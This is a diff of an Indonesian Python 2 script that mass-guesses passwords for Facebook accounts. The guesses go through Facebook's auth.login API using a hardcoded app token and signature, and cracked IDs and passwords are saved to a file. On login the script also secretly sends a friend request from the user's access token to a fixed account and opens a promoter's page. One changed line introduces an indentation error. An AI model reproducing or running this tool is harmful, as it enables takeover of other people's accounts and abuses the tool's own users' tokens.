@@ -133,7 +133,7 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.youtube.com/omaliptv')
+				os.system('xdg-open https://www.facebook.com/naga.booyahh')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
@@ -419,7 +419,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = 'Sayang'
+													pass6 = 'memek'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -438,6 +438,7 @@ def pilih_super():
 															cek.write("ID:" +user+ " Pw:" +pass6+"\n")
 															cek.close()
 															cekpoint.append(user+pass6)
+
 		except:
 			pass
 		
@@ -758,7 +759,7 @@ def clone_dari_member_group():
 		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
 		asw=json.loads(r.text)
 		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
-	except KeyError:
+	 except KeyError:
 		print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
 		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
 		menu()
